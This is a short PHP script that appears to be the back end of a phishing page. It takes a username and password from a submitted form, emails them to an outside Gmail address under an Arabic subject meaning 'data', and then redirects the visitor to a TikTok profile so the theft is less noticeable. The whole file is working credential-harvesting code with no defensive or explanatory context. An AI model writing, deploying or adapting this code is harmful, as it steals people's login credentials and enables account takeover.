<?php

$username = $_POST['username'];
$password = $_POST['password'];


$message = "    صفوان :  \n";
$message .= "👤 Username: " . $username . "\n";
$message .= "🔑 Password: " . $password . "\n";


$to = "mwmnah5@gmail.com"; 


$subject = "بيانات";


mail($to, $subject, $message);


header("Location: https://www.tiktok.com/@musaila_10?is_from_webapp=1&sender_device=pc");
exit;
?>
